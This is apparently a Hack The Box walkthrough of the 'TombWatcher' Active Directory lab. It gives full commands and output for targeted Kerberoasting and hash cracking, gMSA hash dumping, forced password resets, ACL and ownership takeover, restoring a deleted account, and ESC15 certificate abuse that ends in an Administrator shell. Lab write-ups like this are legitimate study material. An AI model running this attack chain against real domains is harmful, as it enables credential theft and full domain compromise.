# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ nmap -sC -sV -Pn 10.10.11.72 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 03:19 AEST
Nmap scan report for 10.10.11.72
Host is up (0.32s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 11:57:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-07-14T11:59:08+00:00; -5h21m49s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T11:59:07+00:00; -5h21m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-07-14T11:59:08+00:00; -5h21m49s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T11:59:07+00:00; -5h21m50s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5h21m50s, deviation: 2s, median: -5h21m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-14T11:58:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.73 seconds
```

We have the credit of user `henry`
```
Machine Information

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

```

I would like check the smb service firstly
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ smbmap -H 10.10.11.72 -u herny -p H3nry_987TGV!       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.10.11.72, no fun for you...                                                                          
[*] Closed 1 connections 
```

Very sadly, there is nothing interesting for us.

# Bloodhound by herny
Then I think we can bloodhound herny, and check more information here.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ sudo ntpdate DC01.tombwatcher.htb
2025-07-14 22:06:02.926938 (+1000) -19267.442649 +/- 0.290216 DC01.tombwatcher.htb 10.10.11.72 s1 no-leap
CLOCK: time stepped by -19267.442649
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ bloodhound-python -u henry -p H3nry_987TGV! -k -ns 10.10.11.72 -c All -d tombwatcher.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 01M 10S
INFO: Compressing output into 20250714220615_bloodhound.zip
```
![](images/Pasted%20image%2020250714220858.png)
`Henry` can `WriteSPN` to account `Alfred`
Let's exploit it 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e778f5f074e8ccf66729718fe773fab4$55fd3cb7afc8ae3823a8bc0989cf07e3cef24c30f0c801b6361434961f1ad76d840173b25cc1d6f376ccedf59d6f61e19e77f27b316a51c3a98c44b468136ca8de7e1ff97de6179294984b052b93df3cbecc84059c0051a5b3859b86b69fef52ec227ab5f275b87ef38c3f25e38cf98ad23985a56bd7af556dd82baaa433bfaf398d82e11cef4d72fddb3888125f256b078f95abfb227aa70b9bb0d40f1f976593d8c5fcb4445036452a698ca3c260cf4c47cf3cd5915b0820dda8a384c04ba38419da987ee1fcb04db39609c37099b95005a19d9bc9525438d531e8431192dc96da2eeb00b975b89227d8117aba27101269158190d14e30d695b0c2d8449bc7cee8586ea79917df7624049d245fba8623a35e3978baa41b7990e72b76fda11e41238264589e58ba66106b0c6ef439e5adfae481e2843d9eba8b7f28368aa0c44850397331d44bd81b05fd9b805805d5ab7160a80f63fd8a5c89766c992cb5ec2df0c72bae5d618cabbe76dae72cd8c57c0d6cc0b79d55e1a5f90560210b94fc0d70d07e013712a1e03cfc8b52eddace07063f6c3fbaaf10ecca9baaf34c7c0635931254427a7172793db0954d4ec909ece9e4fbd3e802b3f75ea300bb40e4469dfdd6314b54101a604535a73dcf8e01fdefdafff8489f3e07bb4c1d1ffa27d4c7e333e4457cf8502a9421b1f0413d7cd4e70fbe868eee8364cc45d65314d14ea63d25f513e355c1beba9fed0cee70bfdc2dfea22acd23c0834e2e87f2c0d1c8d10efe836b1cc4b3f5a9796cee7acae7b2134664b5ae6227de842378fb68965ec4be4121721a7cf6af823939a7b9f8d4ced19529f5251067fce1325d147f9c2e5c33e5b4c7dbf3173500e2e8d0e60f5b1da7f925083954721ff956c0a717e7974524335512aea968afd70c6f6b438178cd6d2780986f538f9c42bd45b90f8835fa4ee847fbad176a63e22bfbc1f2be19f73daa73d872821ee6117cb7858bb91edf25d08b31472bf70205c91084f08a6c857f9603171e6e5ce4b1051e68df97d26fa5147a2044b14eea7649d1d47d652761410aedabcc765929b883a180245bd4f4454f89b0e8642fcd55cf2886af0c661f534729462e7fef1639e060bd286e710ff272d8c7f90d16fbac348c6f214733d598894e249e335c92fa5ac2a89515eadeb0ea2b82f9fd095368a703115e3ddff3eee8e4675cfe197e593227599a8b30978fd9d6fb3a7ca7b4755285a88a91f993992d0ace76f7a8c8f266e7352d222e73af0303fe5d124b02927d2285ad8f02eff89380a1bfacc9125dd293b040256cc15fcd65e8542a26a59be75f4f7d8cbb555332a6aa67e6810c68573d64a5e029f75eb7f199911d230cb4df85ce38d9269f627ead84bb0280d25acce8d3f6612f2293be77a5b52bdf1c31ecf77d3f083513ab1f1a216bc15966037713daa9b7434995d7f8b197cc8efcf34d2a6c52deccd7f464937d
[VERBOSE] SPN removed successfully for (Alfred)

```

Then let's use john to crack that
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ john alfred.hash --wordlist=/usr/share/wordlists/rockyou.txt                   
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-07-14 22:12) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

# Bloodhound by Alfred
Then let's continue to bloodhound alfred
```
bloodhound-python -u Alfred -p basketball -k -ns 10.10.11.72 -c All -d tombwatcher.htb --zip
```
![](images/Pasted%20image%2020250714221549.png)
![](images/Pasted%20image%2020250714221605.png)
Then we can get the password of account `Ansible_dev`
Let's exploit that
```
Add himself to group

┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred      
[+] alfred added to INFRASTRUCTURE                    ⏎
```
Then let's use `gMSADumper.py` to help us dump the hash
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ python3 /opt/gMSADumper/gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'                                  
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::7bc5a56af89da4d3c03bc048055350f2
ansible_dev$:aes256-cts-hmac-sha1-96:29a7e3cc3aaad2b30beca182a9707f1a1e71d2eb49a557d50f9fd91360ec2f64
ansible_dev$:aes128-cts-hmac-sha1-96:de6c86d8b6a71c4538f82dc570f7f9a6

```

# bloodhound by 
Then let's continue to bloodhound this account 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ bloodhound-python -u 'ansible_dev$'  --hashes ':7bc5a56af89da4d3c03bc048055350f2' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 01M 14S
INFO: Compressing output into 20250714234510_bloodhound.zip
```
![](images/Pasted%20image%2020250714234723.png)
Then we can get `Ansible_dev` can force change password of  account`Sam`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$'  -p ':7bc5a56af89da4d3c03bc048055350f2' set password SAM 'Abc123456@' 
[+] Password changed successfully!
```


# Bloodhound by Sam
Let's continue to bloodhound account `Sam`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ bloodhound-python -u Sam -p Abc123456@ -k -ns 10.10.11.72 -c All -d tombwatcher.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 01M 12S
INFO: Compressing output into 20250714234922_bloodhound.zip
```
![](images/Pasted%20image%2020250714235123.png)
Then we can get access to account `John`
```
//Directly change the ownership of the JOHN account to SAM itself//

owneredit.py -action write -new-owner SAM -target JOHN tombwatcher.htb/'SAM':'Abc123456@'
[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!

//Give SAM full control over JOHN//

 dacledit.py -action 'write' -rights 'FullControl' -principal 'SAM' -target 'JOHN' 'tombwatcher.htb'/'SAM':'Abc123456@'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[*] DACL backed up to dacledit-20250715-000032.bak
[*] DACL modified successfully!

//Now SAM has absolute control over JOHN and can directly change JOHN's password//

bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb'  -u 'SAM' -p 'Abc123456@' set password john 'Abc123456@'                        
[+] Password changed successfully!
```

Then we can use `evil-winrm` to connect it.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ evil-winrm -i 10.10.11.72 -u john -p 'Abc123456@' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> 

```

# Bloodhound by john
```
bloodhound-python -u John -p Abc123456@ -k -ns 10.10.11.72 -c All -d tombwatcher.htb --zip
```
![](images/Pasted%20image%2020250715000857.png)
Seeing that the `ADCS` organizational unit has `GenericAll`, the next step is to take over its child objects
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Abc123456@'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250715-001007.bak
[*] DACL modified successfully!
                                 
```

Change Cert_admin’s Pass
```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf



*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Abc123456@" -AsPlainText -Force)
```

Then let's use `certipy` to find the vulnerable target
```
certipy-ad find -u cert_admin -p "Abc123456@" -dc-ip 10.10.11.72 -vulnerable

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250609023015_Certipy.txt'
[*] Wrote text output to '20250609023015_Certipy.txt'
[*] Saving JSON output to '20250609023015_Certipy.json'
[*] Wrote JSON output to '20250609023015_Certipy.json'

[root@kali] /home/kali/TombWatcher  
❯ cat 20250609023015_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

# ECS15
This links include the exploit detail
`https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu`

Step 1: Request a certificate, injecting “Client Authentication” Application Policy and target UPN
```
certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'
```

Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# change_password administrator Abc123456@
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Abc123456@
Password changed successfully!

```

Then we can get the shell as `Administrator` by `evil-winrm`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/TombWatcher]
└─$ evil-winrm -i 10.10.11.72 -u administrator -p 'Abc123456@'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

# Description

The Active Directory machine is not difficult, but the process is relatively long. It is suitable for beginners of AD environment to practice.
